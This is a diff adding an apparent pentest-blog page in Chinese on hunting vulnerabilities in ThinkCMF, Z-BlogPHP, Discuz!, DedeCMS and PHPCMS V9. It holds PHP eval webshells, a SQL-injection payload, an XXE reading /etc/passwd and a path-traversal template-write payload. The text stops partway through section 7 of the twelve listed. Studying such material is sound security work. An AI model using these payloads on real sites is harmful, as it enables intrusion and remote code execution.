@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="前言CMS（内容管理系统）占据互联网网站绝大部分份额。由于开源、用户基数大、插件生态复杂，一直是安全研究的重点领域。本文整理国内常见CMS的漏洞挖掘思路与代码审计方法论，适合有PHP基础的安全从业者参考。 一、CMS代码审计通用方法论1.1 环境搭建获取完整源码后搭建本地调试环境：PHP 5.6&#x2F;7.x + MySQL + Nginx，启用Xdebug进行动态调试，配合Seay源代码审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="常见CMS漏洞挖掘思路">
+<meta property="og:url" content="https://congliang.github.io/CMS-common-vulnerabilities/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="前言CMS（内容管理系统）占据互联网网站绝大部分份额。由于开源、用户基数大、插件生态复杂，一直是安全研究的重点领域。本文整理国内常见CMS的漏洞挖掘思路与代码审计方法论，适合有PHP基础的安全从业者参考。 一、CMS代码审计通用方法论1.1 环境搭建获取完整源码后搭建本地调试环境：PHP 5.6&#x2F;7.x + MySQL + Nginx，启用Xdebug进行动态调试，配合Seay源代码审计">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-06-10T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:45.830Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="框架安全">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/CMS-common-vulnerabilities/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/CMS-common-vulnerabilities/","path":"CMS-common-vulnerabilities/","title":"常见CMS漏洞挖掘思路"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>常见CMS漏洞挖掘思路 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E8%AE%BA"><span class="nav-number">2.</span> <span class="nav-text">一、CMS代码审计通用方法论</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">2.1.</span> <span class="nav-text">1.1 环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-%E5%85%A5%E5%8F%A3%E6%96%87%E4%BB%B6%E4%B8%8E%E8%B7%AF%E7%94%B1"><span class="nav-number">2.2.</span> <span class="nav-text">1.2 入口文件与路由</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-%E5%85%B3%E9%94%AE%E5%87%BD%E6%95%B0%E5%AE%9A%E4%BD%8D"><span class="nav-number">2.3.</span> <span class="nav-text">1.3 关键函数定位</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-%E5%85%A8%E5%B1%80%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="nav-number">2.4.</span> <span class="nav-text">1.4 全局过滤绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81ThinkCMF-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="nav-number">3.</span> <span class="nav-text">二、ThinkCMF 漏洞挖掘</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81Z-BlogPHP-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="nav-number">4.</span> <span class="nav-text">三、Z-BlogPHP 漏洞挖掘</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81Discuz-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="nav-number">5.</span> <span class="nav-text">四、Discuz! 漏洞挖掘</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81DedeCMS-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="nav-number">6.</span> <span class="nav-text">五、DedeCMS 漏洞挖掘</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81PHPCMS-V9-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="nav-number">7.</span> <span class="nav-text">六、PHPCMS V9 漏洞挖掘</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81%E5%90%8E%E5%8F%B0GetShell%E9%80%9A%E7%94%A8%E6%8A%80%E6%9C%AF"><span class="nav-number">8.</span> <span class="nav-text">七、后台GetShell通用技术</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB%E3%80%81%E6%8F%92%E4%BB%B6%E4%B8%8E%E4%B8%BB%E9%A2%98%E6%BC%8F%E6%B4%9E%E6%A8%A1%E5%BC%8F"><span class="nav-number">9.</span> <span class="nav-text">八、插件与主题漏洞模式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B9%9D%E3%80%81SRC-CMS%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AE%9E%E6%88%98"><span class="nav-number">10.</span> <span class="nav-text">九、SRC CMS漏洞挖掘实战</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#9-1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">10.1.</span> <span class="nav-text">9.1 信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-2-%E6%B5%8B%E8%AF%95%E8%A7%84%E8%8C%83"><span class="nav-number">10.2.</span> <span class="nav-text">9.2 测试规范</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-3-%E9%AB%98%E6%95%88%E7%AD%96%E7%95%A5"><span class="nav-number">10.3.</span> <span class="nav-text">9.3 高效策略</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-4-Fuzzing%E5%AD%97%E5%85%B8%E5%85%B3%E9%94%AE%E8%AF%8D"><span class="nav-number">10.4.</span> <span class="nav-text">9.4 Fuzzing字典关键词</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E3%80%81%E5%AE%9E%E6%88%98%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B"><span class="nav-number">11.</span> <span class="nav-text">十、实战代码示例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ThinkCMF-%E7%BC%93%E5%AD%98%E5%86%99%E5%85%A5GetShell"><span class="nav-number">11.1.</span> <span class="nav-text">ThinkCMF 缓存写入GetShell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DedeCMS-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%88%A9%E7%94%A8%E9%93%BE"><span class="nav-number">11.2.</span> <span class="nav-text">DedeCMS 变量覆盖利用链</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Discuz-UC-KEY-%E4%BC%AA%E9%80%A0%E9%80%9A%E7%9F%A5"><span class="nav-number">11.3.</span> <span class="nav-text">Discuz! UC_KEY 伪造通知</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E4%B8%80%E3%80%81%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="nav-number">12.</span> <span class="nav-text">十一、防御建议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E4%BA%8C%E3%80%81%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="nav-number">13.</span> <span class="nav-text">十二、免责声明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%BA%90"><span class="nav-number">14.</span> <span class="nav-text">参考资源</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/CMS-common-vulnerabilities/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="常见CMS漏洞挖掘思路 | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          常见CMS漏洞挖掘思路
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-06-10 08:00:00" itemprop="dateCreated datePublished" datetime="2026-06-10T08:00:00+08:00">2026-06-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CMS（内容管理系统）占据互联网网站绝大部分份额。由于开源、用户基数大、插件生态复杂，一直是安全研究的重点领域。本文整理国内常见CMS的漏洞挖掘思路与代码审计方法论，适合有PHP基础的安全从业者参考。</p>
+<h2 id="一、CMS代码审计通用方法论"><a href="#一、CMS代码审计通用方法论" class="headerlink" title="一、CMS代码审计通用方法论"></a>一、CMS代码审计通用方法论</h2><h3 id="1-1-环境搭建"><a href="#1-1-环境搭建" class="headerlink" title="1.1 环境搭建"></a>1.1 环境搭建</h3><p>获取完整源码后搭建本地调试环境：PHP 5.6&#x2F;7.x + MySQL + Nginx，启用Xdebug进行动态调试，配合Seay源代码审计系统或Rips做初步扫描。对停止维护的老系统（DedeCMS），应保留多个历史版本做diff比对——很多漏洞从补丁对比中逆向发现。</p>
+<h3 id="1-2-入口文件与路由"><a href="#1-2-入口文件与路由" class="headerlink" title="1.2 入口文件与路由"></a>1.2 入口文件与路由</h3><p>每个CMS的入口文件是审计起点，重点分析：</p>
+<ul>
+<li>常量定义与安全过滤机制（如<code>defined(&#39;IN_CMS&#39;) or exit</code>）</li>
+<li>全局包含文件（common.php、global.func.php）</li>
+<li>路由分发与MVC调度逻辑</li>
+<li>全局WAF或输入过滤函数</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 典型入口结构</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;APP_PATH&#x27;</span>, <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>) . <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span> APP_PATH . <span class="string">&#x27;config/config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> APP_PATH . <span class="string">&#x27;core/function.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-3-关键函数定位"><a href="#1-3-关键函数定位" class="headerlink" title="1.3 关键函数定位"></a>1.3 关键函数定位</h3><p>审计中优先搜索的危险函数：</p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>函数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>SQL操作</td>
+<td>mysql_query, mysqli_query, query, execute</td>
+</tr>
+<tr>
+<td>文件包含</td>
+<td>include, require, include_once</td>
+</tr>
+<tr>
+<td>文件读写</td>
+<td>file_get_contents, file_put_contents, fwrite</td>
+</tr>
+<tr>
+<td>命令执行</td>
+<td>system, exec, shell_exec, passthru</td>
+</tr>
+<tr>
+<td>代码执行</td>
+<td>eval, assert, preg_replace &#x2F;e, create_function</td>
+</tr>
+<tr>
+<td>反序列化</td>
+<td>unserialize</td>
+</tr>
+<tr>
+<td>SSRF</td>
+<td>curl_exec, file_get_contents(URL)</td>
+</tr>
+</tbody></table>
+<h3 id="1-4-全局过滤绕过"><a href="#1-4-全局过滤绕过" class="headerlink" title="1.4 全局过滤绕过"></a>1.4 全局过滤绕过</h3><p>大部分CMS在入口做全局过滤，分析绕过思路：</p>
+<ul>
+<li><strong>宽字节注入</strong>：GBK下<code>%df%27</code>绕过addslashes</li>
+<li><strong>二次注入</strong>：入库时转义，出库时未转义直接拼接</li>
+<li><strong>数组绕过</strong>：过滤仅处理字符串，嵌套数组key值被忽略</li>
+<li><strong>编码差异</strong>：UTF-8与GBK转换时的字符边界问题</li>
+</ul>
+<hr>
+<h2 id="二、ThinkCMF-漏洞挖掘"><a href="#二、ThinkCMF-漏洞挖掘" class="headerlink" title="二、ThinkCMF 漏洞挖掘"></a>二、ThinkCMF 漏洞挖掘</h2><p>ThinkCMF基于ThinkPHP，MVC架构。核心目录：<code>app/</code>（应用）、<code>simplewind/cmf/</code>（框架）、<code>vendor/</code>（依赖）。</p>
+<p><strong>模板注入GetShell</strong>：后台”模板管理”中可编辑模板文件写入PHP代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;php&gt;@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);&lt;/php&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>SQL注入</strong>：复杂查询中<code>field()</code>、<code>order()</code>、<code>group()</code>参数可能未绑定：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$order</span> = <span class="title function_ invoke__">I</span>(<span class="string">&#x27;get.order&#x27;</span>);</span><br><span class="line"><span class="variable">$list</span> = <span class="title class_">Db</span>::<span class="title function_ invoke__">name</span>(<span class="string">&#x27;article&#x27;</span>)-&gt;<span class="title function_ invoke__">order</span>(<span class="variable">$order</span>)-&gt;<span class="title function_ invoke__">select</span>();</span><br><span class="line"><span class="comment">// payload: order=extractvalue(1,concat(0x7e,database()))</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>缓存Key注入</strong>：若缓存键名可控且支持<code>../</code>路径穿越，可写PHP到web可访问目录：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">cache</span>(<span class="string">&#x27;../upload/evil.php&#x27;</span>, <span class="string">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="三、Z-BlogPHP-漏洞挖掘"><a href="#三、Z-BlogPHP-漏洞挖掘" class="headerlink" title="三、Z-BlogPHP 漏洞挖掘"></a>三、Z-BlogPHP 漏洞挖掘</h2><p>Z-BlogPHP轻量级博客，核心安全较完善，但插件体系庞大，漏洞多集中于第三方插件。</p>
+<p><strong>插件安装XXE</strong>：在线安装插件时解析XML配置文件，可构造XXE读文件：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [<span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>主题文件包含</strong>：主题目录<code>zb_users/theme/</code>下若存在可控include点：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$tpl</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;tpl&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$tpl</span> . <span class="string">&#x27;.php&#x27;</span>;  <span class="comment">// 文件包含</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>后台模块管理GetShell</strong>：后台”新建模块”允许编写PHP代码保存为模块文件。审计重点在于是否存在权限绕过直接访问保存接口。</p>
+<p><strong>XML-RPC未授权</strong>：部分版本中XML-RPC接口结合<code>system.multicall</code>可构造复杂攻击链。</p>
+<hr>
+<h2 id="四、Discuz-漏洞挖掘"><a href="#四、Discuz-漏洞挖掘" class="headerlink" title="四、Discuz! 漏洞挖掘"></a>四、Discuz! 漏洞挖掘</h2><p>Discuz!是使用最广泛的社区论坛，核心层安全性较高，漏洞集中于插件、模板和UCenter通信模块。</p>
+<p><strong>UCenter通信密钥利用</strong>：通过任意文件读取获取<code>config_ucenter.php</code>中<code>UC_KEY</code>后，可伪造UCenter通知实现getshell：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">authcode</span>(<span class="string">&#x27;action=updateapps&amp;...&#x27;</span>, <span class="string">&#x27;ENCODE&#x27;</span>, UC_KEY);</span><br><span class="line"><span class="comment">// 目标: /api/uc.php?code=$code</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>后台DIY模板GetShell</strong>：门户 -&gt; 模板管理 -&gt; DIY模板支持直接编辑含PHP的模板。越权访问该接口即可getshell。</p>
+<p><strong>插件钩子注入</strong>：插件注册的全局钩子（<code>global_xxx</code>）在所有页面执行，若内部拼接SQL且参数可控：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">global_xxx</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$var</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>];</span><br><span class="line">    DB::<span class="title function_ invoke__">query</span>(<span class="string">&quot;SELECT * FROM &quot;</span> . DB::<span class="title function_ invoke__">table</span>(<span class="string">&#x27;xxx&#x27;</span>) . <span class="string">&quot; WHERE id=<span class="subst">$var</span>&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="五、DedeCMS-漏洞挖掘"><a href="#五、DedeCMS-漏洞挖掘" class="headerlink" title="五、DedeCMS 漏洞挖掘"></a>五、DedeCMS 漏洞挖掘</h2><p>DedeCMS已停更多年，但历史站点众多。代码风格老旧、全局过滤不完善，是漏洞高发区。</p>
+<p><strong>变量覆盖</strong>是最核心的安全问题（<code>include/common.inc.php</code>）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$_k</span> =&gt; <span class="variable">$_v</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_k</span>) &gt; <span class="number">0</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(_|cfg_|GLOBALS)/&#x27;</span>, <span class="variable">$_k</span>)) <span class="keyword">exit</span>;</span><br><span class="line">    $&#123;<span class="variable">$_k</span>&#125; = <span class="title function_ invoke__">_RunMagicQuotes</span>(<span class="variable">$_v</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>利用链：覆盖<code>$cfg_dbprefix</code>实现SQL注入、覆盖<code>$cfg_imgtype</code>绕过上传白名单。</p>
+<p><strong>SQL注入</strong>：大量语句用字符串拼接且未做类型转换：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM dede_archives WHERE id=<span class="subst">$id</span>&quot;</span>;  <span class="comment">// 数字型注入</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>会员中心上传绕过</strong>：利用双扩展名、截断、解析漏洞或头像上传点绕过。</p>
+<hr>
+<h2 id="六、PHPCMS-V9-漏洞挖掘"><a href="#六、PHPCMS-V9-漏洞挖掘" class="headerlink" title="六、PHPCMS V9 漏洞挖掘"></a>六、PHPCMS V9 漏洞挖掘</h2><p>MVC架构，核心库在<code>phpcms/</code>，全局函数在<code>phpcms/libs/functions/</code>。</p>
+<p><strong>模板标签注入</strong>：若标签参数可控且未校验，值被直接拼入SQL：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;pc:content action=&quot;lists&quot; catid=&quot;$catid&quot;&#125;</span><br><span class="line"><span class="comment">&lt;!-- catid可控 =&gt; SQL注入 --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>附件上传</strong>：文件类型检查依赖扩展名白名单。绕过思路：寻找不在主上传模块管理的独立上传点、编辑器上传、SWFUpload组件缺陷。</p>
+<p><strong>碎片管理GetShell</strong>：后台”碎片管理”允许创建任意内容碎片，关注权限检查是否存在越权。</p>
+<hr>
+<h2 id="七、后台GetShell通用技术"><a href="#七、后台GetShell通用技术" class="headerlink" title="七、后台GetShell通用技术"></a>七、后台GetShell通用技术</h2><p><strong>模板&#x2F;主题编辑</strong>（最直接）：需要绕过的障碍包括权限控制、CSRF Token、文件扩展名限制。通用payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=../../../index.php&amp;content=&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>数据库备份</strong>：备份为<code>.php</code>后缀，在数据中插入PHP代码；或备份路径可控写入web目录。</p>
